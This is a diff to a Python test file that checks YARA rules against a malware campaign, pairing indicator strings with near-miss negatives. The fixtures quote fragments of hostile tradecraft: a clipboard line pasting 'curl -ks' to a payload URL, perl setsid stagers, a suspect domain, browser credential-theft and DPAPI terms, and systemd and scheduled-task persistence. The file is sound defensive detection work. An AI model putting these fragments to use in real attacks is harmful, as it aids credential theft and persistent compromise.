@@ -27,12 +27,28 @@ class DetectionTests(unittest.TestCase):
                 b'GUS_UPLOAD_CHUNK_SIZE DEFAULT_PHASE3_MAX_MS OVERLORD_KEEP_AGENT_STATE',
             ),
             'deaddrop_clickfix_lure': (
-                b'cmdline_copied text/plain VERIFY- clipboardData.setData',
-                b'text/plain VERIFY- clipboardData.setData',
+                b'cmdline_copied text/plain VERIFY- clipboardData.setData' + b' ' * (16 * 1024 + 1),
+                b'text/plain VERIFY- clipboardData.setData' + b' ' * (16 * 1024 + 1),
             ),
             'deaddrop_clickfix_fleet_bundle': (
                 b'navigator.clipboard.writeText text/plain cmdline_copied curl -ks VERIFY- perl -MPOSIX -e',
                 b'navigator.clipboard.writeText text/plain cmdline_copied curl -ks perl -MPOSIX -e',
+            ),
+            'deaddrop_clickfix_copy_hijack': (
+                b'navigator.clipboard.writeText("curl -ks https://example.invalid/payload")' + b' ' * (16 * 1024 + 1),
+                b'navigator.clipboard.writeText("npm install example")' + b' ' * (16 * 1024 + 1),
+            ),
+            'deaddrop_clickfix_device_check': (
+                b'tensorflow three device-check curl -ks ' + b' ' * (300 * 1024 + 1),
+                b'tensorflow three device-check ' + b' ' * (300 * 1024 + 1),
+            ),
+            'deaddrop_clickfix_d2s_build': (
+                b'perl -MPOSIX POSIX::setsid design-challenge /guide.mp4 track-activity',
+                b'perl -MPOSIX POSIX::setsid design-challenge track-activity',
+            ),
+            'deaddrop_clickfix_d2s_stage1': (
+                b'd2saitrade.ink /guard-launcher-result deepfake_guard',
+                b'example.invalid /guard-launcher-result deepfake_guard',
             ),
             'deaddrop_stage1_dropper': (
                 b'guard-launcher-result X-Guard-Platform deepfake_guard NVDG_DETACHED',
@@ -43,7 +59,7 @@ class DetectionTests(unittest.TestCase):
                 b'deepfake_guard_work',
             ),
             'deaddrop_encrypted_stage3_loader': (
-                b'const _0x1=require("crypto") aes-256-gcm createDecipheriv',
+                b'const _0x1=require("crypto") aes-256-gcm createDecipheriv setAuthTag _compile',
                 b'const _0x1=require("crypto") createDecipheriv',
             ),
             'deaddrop_electron_com_elevation_source': (
@@ -53,6 +69,10 @@ class DetectionTests(unittest.TestCase):
             'deaddrop_windows_node_collector': (
                 b'--company-wallet-phase1-local --company-wallet-job Login Data _phase1.zip',
                 b'--company-wallet-phase1-local Login Data _phase1.zip',
+            ),
+            'deaddrop_vscode_node_bootstrap': (
+                b'ELECTRON_RUN_AS_NODE X-Company-Wallet-Client-Id' + b' ' * (32 * 1024 + 1),
+                b'ELECTRON_RUN_AS_NODE benign' + b' ' * (32 * 1024 + 1),
             ),
             'deaddrop_app_bound_credential_source': (
                 b'Login Data Local State app_bound_encrypted_key DPAPI AES-GCM',
@@ -70,6 +90,10 @@ class DetectionTests(unittest.TestCase):
                 b'gitlab.com/drop-indexing/tasks /-/raw/main/config.json OVERLORD_SERVER_RAW',
                 b'gitlab.com/drop-indexing/tasks /-/raw/main/config.json',
             ),
+            'deaddrop_linux_persistence_source': (
+                b'/etc/systemd/system/google-agent.service systemctl enable google-agent.service unitStaging',
+                b'/etc/systemd/system/google-agent.service systemctl enable',
+            ),
             'deaddrop_windows_agent_bundle': (
                 b'PK\x03\x04run-update-agent.vbs update-agent.js',
                 b'PK\x03\x04run-update-agent.vbs',
@@ -78,11 +102,38 @@ class DetectionTests(unittest.TestCase):
                 b'OneDrive Reporting Task- Register-ScheduledTask New-ScheduledTaskTrigger whale.vbs -WindowStyle Hidden',
                 b'OneDrive Reporting Task- Register-ScheduledTask New-ScheduledTaskTrigger whale.vbs',
             ),
+            'echoes_wallet_admin_frontend': (
+                b'adminBase.post("admin/wallets/claim-all/") ColdKey mnemonic Aptos EVM',
+                b'adminBase.post("admin/wallets/claim-all/") ColdKey mnemonic',
+            ),
+            'echoes_repository_monitor_frontend': (
+                b'github-jobs-check/ clone_url httpStatus warming_up httpStatus === 404 refresh',
+                b'github-jobs-check/ clone_url httpStatus refresh',
+            ),
+            'echoes_commit_metadata_harvester': (
+                b'https://api.github.com stars: MAX_BRANCHES_PER_REPO = 20 MAX_SEARCH_RESULTS = 1000 author_email committer_email sqlite3',
+                b'https://api.github.com stars: MAX_BRANCHES_PER_REPO = 20 MAX_SEARCH_RESULTS = 1000 author_email sqlite3',
+            ),
+            'echoes_target_pool_merge': (
+                b'ANTISPAM_DOMAINS def is_antispam(email: str) results_antispam.db results_safe.db CREATE TABLE IF NOT EXISTS emails INSERT OR IGNORE INTO emails',
+                b'ANTISPAM_DOMAINS def is_antispam(email: str) results_antispam.db results_safe.db CREATE TABLE IF NOT EXISTS emails',
+            ),
+            # Exact-hash positives are verified in the private artifact replay,
+            # never by bundling the source emails, archives or payloads here.
+            'exact_sample_hashes': (
+                None,
+                b'inert test buffer; not a retained sample',
+            ),
         }
         yara_files = sorted((ROOT / 'rules/yara').glob('*.yar'))
         self.assertEqual({path.stem for path in yara_files}, set(fixtures))
         rules = yara.compile(filepaths={path.stem: str(path) for path in yara_files})
         for namespace, (positive, negative) in fixtures.items():
+            if positive is None:
+                with self.subTest(rule=namespace, case='inert boundary negative'):
+                    matched = {match.namespace for match in rules.match(data=negative)}
+                    self.assertNotIn(namespace, matched)
+                continue
             with self.subTest(rule=namespace, case='positive'):
                 matched = {match.namespace for match in rules.match(data=positive)}
                 self.assertIn(namespace, matched)
